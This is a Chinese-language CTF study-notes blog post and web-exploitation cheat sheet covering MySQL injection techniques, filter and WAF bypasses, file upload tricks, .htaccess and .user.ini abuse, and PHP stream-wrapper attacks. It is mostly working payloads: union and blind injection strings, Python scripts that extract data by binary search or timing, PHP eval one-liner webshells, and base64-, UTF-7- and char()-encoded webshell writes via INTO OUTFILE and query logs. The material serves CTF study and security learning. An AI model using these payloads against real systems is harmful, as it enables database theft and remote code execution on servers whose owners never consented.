title: CTF学习笔记
tags:
  - web知识点
categories:
  - CTF
author: bmth
top_img: 'https://img-blog.csdnimg.cn/20210304213923323.png'
cover: 'https://img-blog.csdnimg.cn/20210304213923323.png'
date: 2020-10-27 17:53:00
---
## web
[狼组安全团队公开知识库](https://wiki.wgpsec.org)
[红方人员实战手册](https://github.com/klionsec/RedTeamer)
[Web安全攻防实战系列](https://github.com/hongriSec/Web-Security-Attack)
[Web安全学习笔记](https://websec.readthedocs.io/zh/latest/index.html)
[https://www.vulnhub.com](https://www.vulnhub.com)
[Vulhub - Docker-Compose file for vulnerability environment](https://vulhub.org)
[https://github.com/w181496/Web-CTF-Cheatsheet](https://github.com/w181496/Web-CTF-Cheatsheet)
### Mysql注入
数据库的一些重要的信息：
```
version():数据库的版本
database():当前所在的数据库
@@basedir:数据库的安装目录
@@datadir:数据库文件的存放目录
user():数据库的用户
current_user():当前用户名
system_user():系统用户名
session_user():连接到数据库的用户名
```
#### 四大注入
##### 联合注入
```sql
-1' order by 3#
-1' union select 1,2,3--+
-1' union select 1,user(),database()--+
-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+
-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
-1' union select 1,2,group_concat(username,password) from users--+
```

**在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据**

union select实现登录：

```sql
username：0' union select 1,'admin','47bce5c74f589f4867dbd57e9ca9f808'#
password：aaa
```
##### 报错注入
MySQL的报错注入主要是利用MySQL的一些逻辑漏洞，如BigInt大数溢出等，由此可以将MySQL报错注入分为以下几类：

- BigInt等数据类型溢出
- 函数参数格式错误
- 主键/字段重复

**floor报错注入**
利用 **count()函数 、rand()函数 、floor()函数 、group by** 这几个特定的函数结合在一起产生的注入漏洞

虚拟表报错原理：简单来说，是由于where条件每执行一次，rand函数就会执行一次，如果在由于在统计数据时判断依据不能动态改变，故`rand()`不能后接在`order/group by`上

```sql
and (select 1 from (select count(*) from information_schema.tables group by concat(user(),floor(rand(0)*2)))a) #
```

**ExtractValue报错注入**
适用版本：5.1.5+

```sql
and extractvalue(1,concat(0x7e,user(),0x7e))#
and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e))#
```

**UpdateXml报错注入**
适用版本: 5.1.5+

UpdateXml 函数实际上是去更新了XML文档，但是我们在XML文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了，但是报错的时候他其实已经执行了那个子查询代码

```sql
and updatexml(1,concat(0x7e,(select database()),0x7e),1)#
and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='flag'),0x7e),1)#
```

[Mysql报错注入原理分析(count()、rand()、group by)](https://www.cnblogs.com/xdans/p/5412468.html)
[updatexml injection without concat](https://xz.aliyun.com/t/2160)
[当concat()在报错注入不可用时](https://www.dazhuanlan.com/2019/11/30/5de149bd419ec/)

##### 布尔盲注
没啥好说的，写脚本就完事了
二分法脚本：

```python
import re
import requests
import string
 
url = "http://649d4d3a-b8a5-449d-82fa-aad24102ca6d.node3.buuoj.cn/search.php"
flag = ''
def payload(i,j):
    # sql = "1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))>%d)^1"%(i,j)       
    # sql = "1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'),%d,1))>%d)^1"%(i,j)
    # sql = "1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))>%d)^1"%(i,j)
    sql = "1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))>%d)^1"%(i,j)
    data = {"id":sql}
    r = requests.get(url,params=data)
    # print (r.url)
    if "Click" in r.text:
        res = 1
    else:
        res = 0
 
    return res
 
def exp():
    global flag
    for i in range(1,1000) :
        print(i,':')
        low = 31
        high = 127
        while low <= high :
            mid = (low + high) // 2
            res = payload(i,mid)
            if res :
                low = mid + 1
            else :
                high = mid - 1
        f = int((low + high + 1)) // 2
        if (f == 127 or f == 31):
            break
        # print (f)
        flag += chr(f)
        print(flag)
 
exp()
print('flag=',flag)
```
##### 时间盲注
**无if和case的解决办法**
假设`if`和`case`被ban了，又想要根据condition的真假来决定是否触发`sleep()`，可以将condition整合进`sleep()`中，做乘法即可:

```
sleep(5*(condition))
```

如果condition为真则返回1，`5*(condition)`即`5*1`为5，延时5秒；如果condition为假则返回0，`5*(condition)`即`5*0`为0，延时0秒

**benchmark()**
`benchmark(count,expr)`函数的执行结果就是将expr表达式执行count次数

```sql
benchmark(30000000,sha(1))
```

**笛卡儿积**
这种方法又叫做`heavy query`，可以通过选定一个大表来做笛卡儿积，但这种方式执行时间会几何倍数的提升，在站比较大的情况下会造成几何倍数的效果，实际利用起来非常不好用

```sql
select count(*) from information_schema.columns A, information_schema.columns B;
```

**get_lock**
在单数据库的环境下，如果想防止多个线程操作同一个表（多个线程可能分布在不同的机器上），可以使用这种方式，取表名为key，操作前进行加锁，操作结束之后进行释放，这样在多个线程的时候，即保证了单个表的串行操作，又保证了多个不同表的并行操作

当我们锁定一个变量之后，另一个session再次包含这个变量就会产生延迟

```sql
(1)我们首先通过注入实现对 username 字段的加锁
select * from ctf where flag = 1 and get_lock('username',1);

(2)然后构造我们的盲注语句
select * from ctf where flag = 1 and 1 and get_lock('username',5);
select * from ctf where flag = 1 and 0 and get_lock('username',5);
```
值得注意的是，利用场景是有条件限制的：**需要提供长连接**
在Apache+PHP搭建的环境中需要使用 `mysql_pconnect`函数来连接数据库

简单的时间盲注脚本：

```python
#coding:utf-8
import requests
import time
import datetime

url = "http://121.196.108.136"

result = ''
for i in range(0,100):
	for char in range(1,127):
		payload ="admin' and if((ascii(substr((select(group_concat(flag))from(flllllllaggggggg)),{},1)))={},benchmark(20000000,md5('aaa')),0)#".format(i,char)
		data={'usname':payload,'pswd':'123'}
		start = int(time.time())
		r = requests.post(url,data=data)
		response_time = int(time.time()) - start
		if response_time >= 2:
			result += chr(char)
			print('Found: {}'.format(result))
			break
```
[mysql 延时注入新思路](https://xz.aliyun.com/t/2288)
[一篇文章带你深入理解 SQL 盲注](https://www.anquanke.com/post/id/170626)
[一文搞定MySQL盲注](https://www.anquanke.com/post/id/266244)
[MySQL时间盲注五种延时方法 (PWNHUB 非预期解)](https://www.cdxy.me/?p=789)
[heavy-query注入](https://www.jianshu.com/p/b6ad41ff69d0)
[无需“in”的SQL盲注](https://nosec.org/home/detail/3830.html)

#### 文件读写
`file_priv`是对于用户的文件读写权限，若无权限则不能进行文件读写操作
可通过下述payload查询权限：
```sql
select file_priv from mysql.user where user=$USER host=$HOST;
```

> secure_file_priv特性：
> secure_file_priv的值为null时，表示限制mysql不允许导入或导出。
> secure_file_priv的值为某一路径时，表示限制mysql的导入或导出只能发生在该路径下
> secure_file_priv的值没有具体值时，表示不对mysql的导入或导出做限制

三种方法查看当前`secure-file-priv`的值：
```sql
select @@secure_file_priv;
select @@global.secure_file_priv;
show variables like "secure_file_priv";
```

**文件读取**
Mysql读取文件通常使用load_file函数，语法如下：
```sql
union select 1,2,load_file("/etc/passwd")#
union select 1,2,load_file(0x2f6574632f706173737764)#
```

第二种读文件的方法：
```sql
load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n'; #读取服务端文件
```

第三种：
```sql
load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n'; #读取客户端文件
```
[CSS-T | Mysql Client 任意文件读取攻击链拓展](https://zhuanlan.zhihu.com/p/102720502)
**文件写入**
> 具体权限要求：
> 1.secure_file_priv支持web目录文件导出
> 2.数据库用户file权限
> 3.获取物理途径

outfile和dumpfile：
```sql
union select 1,2,'<?php @eval($_POST[cmd]);?>' into outfile '/var/www/html/shell.php'#
union select 1,2,0x3c3f70687020406576616c28245f504f53545b636d645d293b3f3e into outfile '/var/www/html/shell.php' #
```

**利用log写入**
但是现在新版本的MySQL设置了导出文件的路径，我们基本上也没有权限去修改配置文件，更无法通过使用select into outfile来写入一句话。这时，我们可以通过修改MySQL的log文件来获取Webshell

同样的具体权限要求：
`数据库用户需具备super和file服务器权限、获取物理路径`

```sql
查看日志是否开启：
show global variables like '%general%'

一般这个日志记录是默认关闭的，需要我们手动开启
set global general_log = on;

修改日志路径(该路径需要设置到web目录下以便可访问)
set global general_log_file='/var/www/html/shell.php'

写入shell
select '<?php @eval($_POST[cmd]);?>'
```

慢查询日志
```sql
set global slow_query_log_file='/var/www/html/shell.php'
set global slow_query_log=1;
```

#### 万能密码
```sql
-1' or 1=1#
username = '=' & password = '='
username = admin & password = '-0-'
username = \ & password = or 1 #
```

**md5($pass,true)**

`ffifdyop` 这个字符串被 md5 哈希了之后会变成 `276f722736c95d99e921722cf9ed621c`，Mysql 刚好又会把 hex 转成 ascii这个字符串，前几位刚好是` ' or '6`，构造成万能密码

```
content: 129581926211651571912466741651878684928
hex: 06da5430449f8f6f23dfc1276f722738
raw: \x06\xdaT0D\x9f\x8fo#\xdf\xc1'or'8
string: T0Do#'or'8
content: ffifdyop
hex: 276f722736c95d99e921722cf9ed621c
raw: 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c
string: 'or'6]!r,b
```

`SELECT * FROM admin WHERE username = 'admin' and password = ''or'6xc9]x99'`

由于**and**运算符优先级比**or**高，所以前面的：`username = 'admin' and password = ''`会先执行，然后将执行结果与后面的`'6xc9]x99'`进行or运算。在布尔运算中，除了`0、'0'、false、null，`其余结果都为真。所以整个SQL语句的where条件判断部分为真
![](https://img-blog.csdnimg.cn/20201003144438903.png)

[【技术分享】MySQL False注入及技巧总结](https://www.anquanke.com/post/id/86021)

#### 绕过技巧
反引号来包含含有特殊字符的表名、列名
**绕过空格**
```
/**/、括号、+、%20、%09、%0a、%0b、%0c、%0d、%a0、%00 tab
```
 `%a0`在特定字符集才能利用
 
括号没有被过滤，可以用括号绕过:
```sql
1'and(sleep(ascii(mid(database()from(1)for(1)))=109))#
select(group_concat(table_name))from(information_schema.tables)where(tabel_schema=database());
```

**绕过逗号**
使用from
```sql
select substr(database() from 1 for 1)#
```

使用join
```sql
union select 1,2
#等价于
union select * from (select 1)a join (select 2)b
```

对于`limit`可以使用`offset`来绕过
```sql
select * from news limit 0,1
# 等价于下面这条SQL语句
select * from news limit 1 offset 0
```

**绕过等于**
使用like、rlike、regexp binary或者使用`<`、`>`
`<>`为不等于，`!(table_name<>'')`可绕过=
也可以用in来绕过，`substr(password,1,1) in('p');`

**替换关键字**
大小写绕过，双写绕过、16进制编码绕过
if函数可用`case when condition then 1 else 0 end`语句代替
```sql
0' or if((ascii(substr((select database()),1,1))>97),1,0)#
0' or case when ascii(substr((select database()),1,1))>97 then 1 else 0 end#
```

`&&`代替and
`||`代替or
`|` 代替 xor

字符串截取函数：

 |              函数               | 说明                                                         |
 | :-----------------------------: | ------------------------------------------------------------ |
 | substr(str,N_start,N_length) | 对指定字符串进行截取，为SUBSTRING的简单版                    |
 |           substring()           | 多种格式`substring(str,pos)、substring(str from pos)、substring(str,pos,len)、substring(str from pos for len)` |
 |         right(str,len)          | 对指定字符串从**最右边**截取指定长度                         |
 |          left(str,len)          | 对指定字符串从**最左边**截取指定长度                         |
 |      rpad(str,len,padstr)       | 在 `str` 右方补齐 `len` 位的字符串 `padstr`，返回新字符串。如果 `str` 长度大于 `len`，则返回值的长度将缩减到 `len` 所指定的长度 |
 |      lpad(str,len,padstr)       | 与RPAD相似，在`str`左边补齐                                  |
 |        mid(str,pos,len)         | 同于 `substring(str,pos,len)`                                |
 |   insert(str,pos,len,newstr)    | 在原始字符串 `str` 中，将自左数第 `pos` 位开始，长度为 `len` 个字符的字符串替换为新字符串 `newstr`，然后返回经过替换后的字符串。`insert(str,len,1,0x0)`可当做截取函数 |
 |      concat(str1,str2...)       | 函数用于将多个字符串合并为一个字符串                         |
 |        group_concat(...)        | 返回一个字符串结果，该结果由分组中的值连接组合而成           |
 |  make_set(bits,str1,str2,...)   | 根据参数1，返回所输入其他的参数值。可用作报错注入，如：`select updatexml(1,make_set(3,'~',(select flag from flag)),1)` |

进制转换函数：

|           函数            | 说明                                                         |      |      |      |      |
| :-----------------------: | ------------------------------------------------------------ | ---- | ---- | ---- | ---- |
|         ord(str)          | 返回字符串第一个字符的ASCII值                                |      |      |      |      |
|          oct(N)           | 以字符串形式返回 `N` 的八进制数，`N` 是一个BIGINT 型数值，作用相当于`conv(N,10,8)` |      |      |      |      |
|        hex(N_or_S)        | 参数为字符串时，返回 `N_or_S` 的16进制字符串形式，为数字时，返回其16进制数形式 |      |      |      |      |
|        unhex(str)         | `hex(str)` 的逆向函数。将参数中的每一对16进制数字都转换为10进制数字，然后再转换成 ASCII 码所对应的字符 |      |      |      |      |
|          bin(N)           | 返回十进制数值 `N` 的二进制数值的字符串表现形式              |      |      |      |      |
|        ascii(str)         | 同`ord(string)`                                              |      |      |      |      |
| conv(N,from_base,to_base) | 将数值型参数 `N` 由初始进制 `from_base` 转换为目标进制 `to_base` 的形式并返回 |      |      |      |      |

**绕过information_schema**
**MySQL5.7的新特性：**

```sql
sys.schema_auto_increment_columns   只显示有自增的表
?id=-1' union all select 1,2,group_concat(table_name) from sys.schema_auto_increment_columns where table_schema=database()--+

sys.schema_table_statistics_with_buffer
?id=-1' union all select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+

mysql.innodb_table_stats
?id=-1' union select 1,(select group_concat(table_name) from mysql.innodb_table_stats),3--+

sys.x$schema_table_statistics_with_buffer
?id=-1' union select 1,2,group_concat(table_name)from sys.x$schema_table_statistics_with_buffer where table_schema=database()--+

sys.x$schema_flattened_keys
?id=-1' union select 1,2,group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()--+

sys.x$ps_schema_table_statistics_io
?id=-1' union select 1,2,group_concat(table_name)from sys.x$ps_schema_table_statistics_io where table_schema=database()--+

sys.schema_table_statistics
```
以上大部分特殊数据库都是在 mysql5.7 以后的版本才有，并且要访问sys数据库需要有相应的权限

但是在使用上面的后两个表来获取表名之后`select group_concat(table_name) from mysql.innodb_table_stats`，我们是没有办法获得列的，这个时候就要采用无列名注入的办法

[聊一聊bypass information_schema](https://www.anquanke.com/post/id/193512)

**绕过安全狗**
sel%ect
针对asp+access：
1. 可以代替空格的字符：%09，%0A，%0C，%0D
2. 截断后面语句的注释符：%00，%16，%22，%27
3. 当%09，%0A，%0C，%0D超过一定的长度，安全狗就失效了

[Fuzz安全狗注入绕过](https://www.cnblogs.com/perl6/p/7076524.html)
[一次实战sql注入绕狗](https://xz.aliyun.com/t/7515)

#### 奇淫巧技
**宽字节注入**
在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字
`%df` 吃掉`\`具体的方法是 `urlencode('\') = %5c%27`，我们在`%5c%27`前面添加`%df`，形成`%df%5c%27`，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，`%df%5c`就是一个汉字，`%27`作为一个单独的`'`符号在外面
```sql
-1%df%27union select 1,user(),3--+
```
**无列名注入**
我们可以利用`union`来给未知列名重命名

```sql
select 1,2,3 union select * from flag;
select `1` from (select 1,2,3 union select * from flag)a;
select `2` from (select 1,2,3 union select * from flag)a;
当 ` 不能使用的时候，使用别名来代替：
select b from (select 1,2 as b,3 union select * from flag)a;

union all select * from (select * from users as a join users as b)as c--+
union all select * from (select * from users as a join users b using(id))c--+
union all select * from (select * from users as a join users b using(id,username))c--+
```

除了之前的`order by`盲注之外，这里再提一种新的方法，直接通过select进行盲注：
核心payload：`(select 'admin','admin')>(select * from users limit 1)`

**regexp注入**
正则注入，若匹配则返回1，不匹配返回0
binary区分大小写

```sql
select (select username from users where id=1) regexp binary '^a';
select * from users where password regexp binary '^ad';
```

`^`若被过滤，可使用`$`来从后往前进行匹配

**like注入**
百分比`%`通配符允许匹配任何字符串的零个或多个字符
下划线`_`通配符允许匹配任何单个字符

```sql
1 union select 1,database() like 's%',3 --+
1 union select 1,database() like '_____',3 --+
1 union select 1,database() like 's____',3 --+
```

**异或注入**
> 0^1 --> 1 语句返回为真
> 0^0 --> 0 语句返回为假
>
> `'1'^1^'1' --> 1` 语句返回为真
> `'1'^0^'1' --> 0` 语句返回为假

```sql
检索数据库：
id=1'^(select(ascii(mid((select(group_concat(schema_name))from(information_schema.schemata)),1,1))=104))^'1
检索表：
id=1'^(select(ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),1,1))=104))^'1
检索字段：
id=1'^(select(ascii(mid((select(group_concat(flag))from(ctf.flag)),1,1))=104))^'1
```

脚本：
```python
import requests


dic = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,"
url = "http://119.23.73.3:5004/?id=1'^"
keyword = "Tip"
string = ""

for i in range(1, 300):
    for j in dic:
        payload = "(select(ascii(mid((select(group_concat(schema_name))from(information_schema.schemata)),{0},1))={1}))^'1".format(str(i),ord(j))
        url_get = url + payload
        #print(url_get)
        content = requests.get(url_get)
        if keyword in content.text:
            string += j
            print(string)
            break
print("result = " + string)
```

[从CTF题中学习几种有趣(奇怪)的SQL注入](https://xz.aliyun.com/t/5356)
[REGEXP注入与LIKE注入学习笔记](https://xz.aliyun.com/t/8003)
[CTF中几种通用的sql盲注手法和注入的一些tips](https://www.anquanke.com/post/id/160584)

**堆叠注入**
在遇到堆叠注入时，如果select、rename、alter和handler等语句都被过滤的话，我们可以用**MySql预处理语句配合concat拼接**来执行sql语句拿flag
1. PREPARE：准备一条SQL语句，并分配给这条SQL语句一个名字(`hello`)供之后调用
2. EXECUTE：执行命令
3. DEALLOCATE PREPARE：释放命令
4. SET：用于设置变量(`@a`)

payload：
`-1';sEt @a=concat("sel","ect flag from flag_here");PRepare hello from @a;execute hello;#`

**MySql 预处理配合十六进制绕过关键字:**
`-1';sEt @a=0x73686F7720646174616261736573;PRepare hello from @a;execute hello;#`

**MySql预处理配合字符串拼接绕过关键字:**
原理就是借助`char()`函数将ascii码转化为字符然后再使用`concat()`函数将字符连接起来

```sql
set @sql=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(39),char(60),char(63),char(112),char(104),char(112),char(32),char(101),char(118),char(97),char(108),char(40),char(36),char(95),char(80),char(79),char(83),char(84),char(91),char(119),char(104),char(111),char(97),char(109),char(105),char(93),char(41),char(59),char(63),char(62),char(39),char(32),char(105),char(110),char(116),char(111),char(32),char(111),char(117),char(116),char(102),char(105),char(108),char(101),char(32),char(39),char(47),char(118),char(97),char(114),char(47),char(119),char(119),char(119),char(47),char(104),char(116),char(109),char(108),char(47),char(102),char(97),char(118),char(105),char(99),char(111),char(110),char(47),char(115),char(104),char(101),char(108),char(108),char(46),char(112),char(104),char(112),char(39),char(59));prepare s1 from @sql;execute s1;

set @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,119,104,111,97,109,105,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare s1 from @sql;execute s1;
```
使用handler：
```sql
handler <tablename> open as <handlername>; #指定数据表进行载入并将返回句柄重命名
handler <handlername> read first; #读取指定表/句柄的首行数据
handler <handlername> read next; #读取指定表/句柄的下一行数据
.....
handler <handlername> close; #关闭句柄
```

**偏移注入**
我们利用`"*"`代替admin表内存在的字段，由于是18个字段数，需要逐步测试，直到返回正常。
```sql
?id=1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,* from sys_admin  #错误
?id=1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from sys_admin     #错误
?id=1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,* from sys_admin        #错误
直到.........
?id=1 union select 1,2,3,4,5,6,7,8,9,10,11,* from sys_admin #正确
```
说明了sys_admin表下有11个字段
**偏移注入的基本公式为:**
`order by 出的字段数减去*号的字段数，然而再用order by的字段数减去2倍刚才得出来的答案`
也就是18-11=7
18-7*2=4
得到答案等于：4

然后依旧是套公式的过程。

```sql
?id=1 union select 1,2,3,4,a.id,b.id,* from (sys_admin as a inner join sys_admin as b on a.id = b.id)
#这里union select 1,2,3,4：顾名思义就是刚才得出来的长度。
#后面的是sql，可作公式。
```
[移位溢注：告别依靠人品的偏移注入](https://gh0st.cn/archives/2017-03-08/1)


sql注入可参考的文章：
[sqli_lab总结](https://www.dazhuanlan.com/2020/03/01/5e5ad85325ae9/)
[SQL注入WIKI](http://sqlwiki.radare.cn/)
[再谈注入](https://xz.aliyun.com/t/9268)
[SQL注入漏洞详解](https://www.anquanke.com/post/id/235970)
[六问MySQL？你敢来挑战吗？](https://www.anquanke.com/post/id/235236)
[对MYSQL注入相关内容及部分Trick的归类小结](https://xz.aliyun.com/t/7169)
[注入地书——注入的基石](https://www.anquanke.com/post/id/254168)
[SQL注入之Mysql注入姿势及绕过总结](https://xz.aliyun.com/t/10594)
[【技术分享】一种新的MySQL下Update、Insert注入方法](https://www.anquanke.com/post/id/85487)
[SQL注入有趣姿势总结](https://xz.aliyun.com/t/5505)
[SQL注入：限制条件下获取表名、无列名注入](https://www.cnblogs.com/20175211lyz/p/12358725.html)
[MYSQL8.0注入新特性](https://xz.aliyun.com/t/8646)
[一次insert注入引发的思考](https://xz.aliyun.com/t/5099)
[Pgsql堆叠注入场景下通过CREATE FUNCTION来实现命令执行](https://www.anquanke.com/post/id/215954)
[XPATH注入学习](https://xz.aliyun.com/t/7791)
[PostgreSQL Injection](https://evi1cg.me/archives/PostgreSQL-Injection.html)
[玩得一手好注入之order by排序篇](https://blog.csdn.net/nzjdsds/article/details/82461922)
[Alternatives to Extract Tables and Columns from MySQL and MariaDB](https://osandamalith.com/2020/01/27/alternatives-to-extract-tables-and-columns-from-mysql-and-mariadb/)

### 文件上传，文件包含
a.php文件
```php
<?php @eval($_POST['pass']);?>
```
可替换为(**PHP7版本已经不支持了**)
```php
GIF89
<script language="php">@eval($_POST['pass']);</script>
```
[一句话木马的套路](https://www.freebuf.com/articles/web/195304.html)
[各种一句话木马大全](https://blog.csdn.net/l1028386804/article/details/84206143)
[PHP Webshell那些事——攻击篇](https://www.anquanke.com/post/id/212728)
[探讨新技术背景下的一句话免杀](https://www.anquanke.com/post/id/197624)

**短标签:**
PHP开启短标签即short_open_tag=on时，可以使用<?=$_?>输出变量
filename=`"<?=@eval($_POST['a']);?>"`

**序列化木马：**
```php
<?php
class A{
    var $a = "<?php phpinfo()?>";
}
$aa = new A();
echo serialize($aa);
?>
```

__扩展名绕过：__
Asp:asa cer cdx
Aspx:ashx asmx ascx
Php:php php3 php4 php5 php7 pht phtml phps
Jsp:jspx jspf

#### .htaccess
##### 图片马解析
SetHandler 指令可以强制所有匹配的文件被一个指定的处理器处理
```
<FilesMatch "xxx">
SetHandler application/x-httpd-php
</FilesMatch>
```
匹配到文件名中含有xxx的字符 就以php形式去解析
```
SetHandler application/x-httpd-php
```
当前目录及其子目录下所有文件都会被当做 php 解析

AddType 指令可以将给定的文件扩展名映射到指定的内容类型
```
AddType application/x-httpd-php .jpg
```
使jpg文件都解析为php文件

**CGI命令执行**
AddHandler 指令可以实现在文件扩展名与特定的处理器之间建立映射
```php
Options ExecCGI #允许CGI执行
AddHandler cgi-script .xxx #将xx后缀名的文件，当做CGI程序进行解析
```

**绕过exif_imagetype**
`.htaccess`上传的时候不能用GIF89a等文件头去绕过exif_imagetype，因为这样虽然能上传成功，但`.htaccess`文件无法生效。这时有两个办法:
一：
```
#define width 1337
#define height 1337
```
二：
在.htaccess前添加`x00x00x8ax39x8ax39`(要在十六进制编辑器中添加，或者使用python的bytes类型)
`x00x00x8ax39x8ax39` 是wbmp文件的文件头
`.htaccess`中以0x00开头的同样也是注释符，所以不会影响.htaccess

##### 文件包含
在本目录或子目录中有可解析的 PHP 文件时，可以通过 php_value 来设置 `auto_prepend_file` 或者 `auto_append_file` 配置选项来让所有的 PHP 文件自动包含一些敏感文件或恶意文件（如WebShell），来触发文件包含

**Base64 编码绕过**
将一句话进行base64编码，然后在.htaccess中利用php伪协议进行解码，比如：
**.htaccess:**
```
#define width 1337
#define height 1337
AddType application/x-httpd-php .abc
php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/shell.abc"
```
**shell.abc：**
```
GIF89a12PD9waHAgZXZhbCgkX0dFVFsnYyddKTs/Pg==
```
这里GIF89a后面那个12是为了补足8个字节，满足base64编码的规则
或者使用
```
#define width 1
#define height 1
AAAAAAAPD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4=
```
也是可以的，注意换行也算一个字节

**UTF-7 编码格式绕过**
images.png
```
+ADw?php eval(+ACQAXw-POST+AFs-cmd+AF0)+ADs?+AD4-
```
然后我们使用 `auto_append_file` 将其包含进来并设置编码格式为 UTF-7 就行了：
```
php_value auto_append_file images.png
php_flag zend.multibyte 1
php_value zend.script_encoding "UTF-7"
```

还可以包含`.htaccess`自身
```
php_value auto_append_file .htaccess
#<?php phpinfo();?>
```

绕过对关键字的过滤我们可以使用反斜杠 `\` 加换行来实现，例如：
```php
AddTy\
pe application/x-httpd-ph\
p .png

# 即: AddType application/x-httpd-php .png
```


[Apache的.htaccess利用技巧](https://xz.aliyun.com/t/8267)
[.htaccess利用与Bypass方式总结 ](https://www.anquanke.com/post/id/205098)
[Apache中.htaccess文件利用的总结与新思路拓展](https://www.freebuf.com/vuls/218495.html)
#### .user.ini
可以借助`.user.ini`轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。在.user.ini写入代码如下，上传：
```php
GIF89a
auto_prepend_file=a.jpg
```
#### windows文件上传特性
上传文件名   | 服务器表面现象|生成文件内容
-------- | --------|-----
test.php:1.jpg| 生成test.php|空
test.php::$DATA| 生成test.php|`<?php phpinfo();?>`
test.php::$INDEX_ALLOCATION|生成test.php文件夹|
test.php::$DATA.jpg|生成0.jpg|`<?php phpinfo();?>`
test.php::$DATA\aaa.jpg|生成aaa.jpg|`<?php phpinfo();?> `

利用步骤：
1. 先上传shell.php:.jpg，得到空的shell.php
2. 再上传shell.<<<，会覆盖原来的shell.php
3. 即可得到webshell

[php一句话绕过技术分析](https://xz.aliyun.com/t/3924#toc-9)
[PHP LFI 利用临时文件 Getshell 姿势 ](https://www.anquanke.com/post/id/201136)

require和取反运算符之间不需要空格照样执行，即`<?=require~%d0%99%93%9e%98?>`

#### PHP伪协议
php遇到不认识的协议就会当目录处理
`url=a://ctfshow.com/../../../../../../../fl0g.txt`
**php://filter**
`?filename=php://filter/convert.base64-encode/resource=xxx.php`
`?filename=php://filter/read=convert.base64-encode/resource=xxx.php` 一样。
条件：只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include；

```
php://filter/convert.%6%32ase64-encode/resource=flag.php
php://filter/resource=flag.php
compress.zlib://flag.php
php://filter/read=string.rot13/resource=flag.php
php://filter/convert.iconv.utf-8.utf-7/resource=flag.php
php://filter/read=convert.quoted-printable-encode/resource=flag.php
php://filter/zlib.deflate/resource=flag.php (本地再 zlib.inflate 解压就可以读到了)
php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
```
file_put_contents中可以调用伪协议，而伪协议处理时会对过滤器urldecode一次，所以是可以利用二次编码绕过的

>a: %6%31
b: %6%32
i: %6%39
q: %7%31
r: %7%32
u: %7%35
U: %5%35

`file_put_contents($content,"<?php exit();".$content);`情况下写文件绕过死亡函数exit
```
php://filter/write=string.%7%32ot13|<?cuc riny($_CBFG[ozgu]);?>|/resource=bmth.php
php://filter/convert.%6%39conv.%5%35CS-2LE.%5%35CS-2BE|?<hp pe@av(l_$OPTSb[tm]h;)>?/resource=bmth.php
php://filter/convert.%6%39conv.%5%35CS-4LE.%5%35CS-4BE|aahp?<e@ p(lavOP_$b[TS]htm>?;)/resource=bmth.php
php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUWydibXRoJ10pOz8+|convert.%6%39conv.%5%35tf-8.%5%35tf-7|convert.%6%32ase64-decode/resource=bmth.php
php://filter/write=convert.%6%39conv.%5%35CS-2LE.%5%35CS-2BE|string.%7%32ot13|a?%3Cuc%20cr@ni(y_$BCGFo[gz]u;)%3E?/resource=bmth.php
php://filter/zlib.deflate|string.tolower|zlib.inflate|?><?php%0Deval($_GET[1]);?>/resource=bmth.php
```
[file_put_content和死亡·杂糅代码之缘](https://xz.aliyun.com/t/8163)
[探索php://filter在实战当中的奇技淫巧](https://www.anquanke.com/post/id/202510)
[可用过滤器列表](https://www.php.net/manual/zh/filters.php)

**php://input**
碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据
`?file=php://input`
POST：`<?PHP fputs(fopen('shell.php','w'),'<?php @eval($_POST[cmd])?>');?>`
条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP < 5.3.0）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行

**data://text/plain**
`?file=data:text/plain,<?php phpinfo()?>`
`?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=`

**phar://伪协议**
用法：`?file=phar://压缩包/内部文件 phar://xxx.png/shell.php `
注意： PHP > =5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式
可以利用压缩过滤器触发phar：compress.zlib://phar:///var/www/html/upload/xxxx.gif

[初探phar://](https://xz.aliyun.com/t/2715)
